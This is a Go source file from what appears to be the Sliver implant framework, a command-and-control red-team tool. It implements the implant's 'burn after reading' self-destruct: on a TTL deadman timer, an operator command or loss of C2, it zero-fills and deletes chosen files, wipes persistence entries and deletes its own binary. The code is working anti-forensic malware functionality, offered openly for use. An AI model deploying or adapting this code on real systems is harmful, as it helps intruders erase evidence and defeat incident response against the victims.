package burn

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	------------------------------------------------------------------------

	Package burn implements the implant's "burn after reading" path:
	cross-platform self-deletion of the running binary plus best-
	effort scrub of configured extra paths and persistence artifacts.

	Used by:
	  - TTL ticker (built-in expiry timer; the implant's deadman switch)
	  - Operator-fired self-destruct task over the trigger transport
	  - Future: c2-unreachable threshold, anti-forensic triggers

	Design choices:

	  Best-effort, never abort. If wiping path A fails, log it (when
	  debug is on) and continue to B. Half-burned is still better
	  than not-burned.

	  No external dependencies. burn must work even when the rest of
	  the implant's transport machinery has been torn down. Stdlib
	  os/exec and platform-specific calls only.

	  Process exits at the END, not before. We're racing the OS — the
	  destructive steps happen first, then os.Exit(0). On POSIX this
	  is straightforward (running binaries are unlinkable). On Windows
	  we delegate the final binary delete to a detached cmd.exe child
	  via platform-specific code.

	  Final audit emit. If a sink is configured (via SetAuditEmitter),
	  emit a single "burn-initiated" line BEFORE wiping anything. The
	  implant can't talk back after it's burned itself.
*/

import (
	"io"
	"os"
	"sync"
	"time"
)

// Reason categorizes why a burn was initiated. Carried in the final
// audit event so operators can correlate post-burn.
type Reason string

const (
	ReasonTTLExpired        Reason = "ttl-expired"
	ReasonOperatorTriggered Reason = "operator-triggered"
	ReasonUnreachable       Reason = "c2-unreachable"
	ReasonManual            Reason = "manual"
)

// Options tunes the scope of a burn.
type Options struct {
	// Reason is included in the final audit emit. Free-form string;
	// the typed Reason constants above are the common cases.
	Reason Reason

	// ExtraPaths is a list of additional files/directories to remove.
	// Walked in declaration order; each failure logged and skipped.
	ExtraPaths []string

	// Persistence is a list of platform-specific persistence
	// artifacts to wipe. Format varies by platform (systemd unit
	// paths on Linux, plist paths on Darwin, registry keys on
	// Windows). Caller-supplied; burn doesn't enumerate persistence
	// automatically because that surface is implant-config dependent.
	Persistence []string

	// SkipSelf, if true, skips deletion of the running binary itself.
	// Used by tests; production should always leave this false.
	SkipSelf bool

	// NoExit, if true, returns instead of os.Exit at the end. Tests
	// only.
	NoExit bool
}

// AuditEmitter sinks one final structured line describing the burn.
// The implant's main transport sets this via SetAuditEmitter at
// startup (e.g., wired into the same audit channel the rest of the
// trigger system uses) so the server-side trigger audit log records
// the implant's last word.
type AuditEmitter interface {
	EmitBurn(reason Reason, when time.Time, opts Options)
}

var (
	emitterMu sync.RWMutex
	emitter   AuditEmitter
)

// TTLResetChan is read by the TTL watchdog in runner/lifecycle.go.
// When a value is received, the watchdog extends the TTL deadline by
// the original duration from now. Buffered(1) so senders never block.
var TTLResetChan = make(chan struct{}, 1)

// ResetTTL signals the TTL watchdog to extend the deadline. Call this
// whenever an authenticated operator signal is received (any trigger
// intent: wake, exec, self-destruct). Non-blocking: if a reset is
// already pending, this coalesces.
//
// Safe to call even when TTL is disabled — the channel exists but
// nobody reads from it, so the send hits the default case and is
// silently dropped.
func ResetTTL() {
	select {
	case TTLResetChan <- struct{}{}:
	default:
	}
}

// SetAuditEmitter installs a non-nil emitter that Now() will call
// once at the start of the burn. Passing nil clears it.
func SetAuditEmitter(e AuditEmitter) {
	emitterMu.Lock()
	defer emitterMu.Unlock()
	emitter = e
}

// Now performs a burn with the given options and exits the process.
// Does NOT return under normal conditions; tests use opts.NoExit to
// override.
//
// Order:
//  1. Emit final audit line (if emitter configured).
//  2. Walk ExtraPaths, removing each (best-effort).
//  3. Walk Persistence via the platform-specific wipePersistence,
//     which knows how to handle systemd / launchd / registry / etc.
//  4. Wipe self binary (platform-specific; POSIX vs Windows differ).
//  5. os.Exit(0) — or return if NoExit.
func Now(opts Options) {
	if opts.Reason == "" {
		opts.Reason = ReasonManual
	}
	now := time.Now().UTC()

	emitterMu.RLock()
	em := emitter
	emitterMu.RUnlock()
	if em != nil {
		// Best effort: don't let an emitter panic block the burn.
		func() {
			defer func() { _ = recover() }()
			em.EmitBurn(opts.Reason, now, opts)
		}()
	}

	for _, path := range opts.ExtraPaths {
		wipePath(path)
	}
	wipePersistence(opts.Persistence)

	if !opts.SkipSelf {
		exe, err := os.Executable()
		if err == nil && exe != "" {
			wipeSelf(exe)
		}
	}

	if opts.NoExit {
		return
	}
	os.Exit(0)
}

// wipePath best-effort removes a single path. If it's a directory,
// recursively removes. If overwrite-then-unlink is requested by the
// caller via a future flag we'd extend here; for MVP, plain unlink.
func wipePath(path string) {
	if path == "" {
		return
	}
	info, err := os.Lstat(path)
	if err != nil {
		return
	}
	if info.Mode().IsRegular() {
		// Best-effort zero-fill before unlink so on-disk recovery is
		// at least mildly harder. Failures fall through to plain remove.
		if f, err := os.OpenFile(path, os.O_WRONLY, 0); err == nil {
			zero := make([]byte, 4096)
			size := info.Size()
			for off := int64(0); off < size; off += int64(len(zero)) {
				n := int64(len(zero))
				if size-off < n {
					n = size - off
				}
				_, _ = f.Write(zero[:n])
			}
			_ = f.Sync()
			_ = f.Close()
		}
	}
	_ = os.RemoveAll(path)
}

// drainAndClose discards then closes an io.ReadCloser. Defensive
// against transport leaks during burn.
func drainAndClose(r io.ReadCloser) {
	if r == nil {
		return
	}
	_, _ = io.Copy(io.Discard, r)
	_ = r.Close()
}
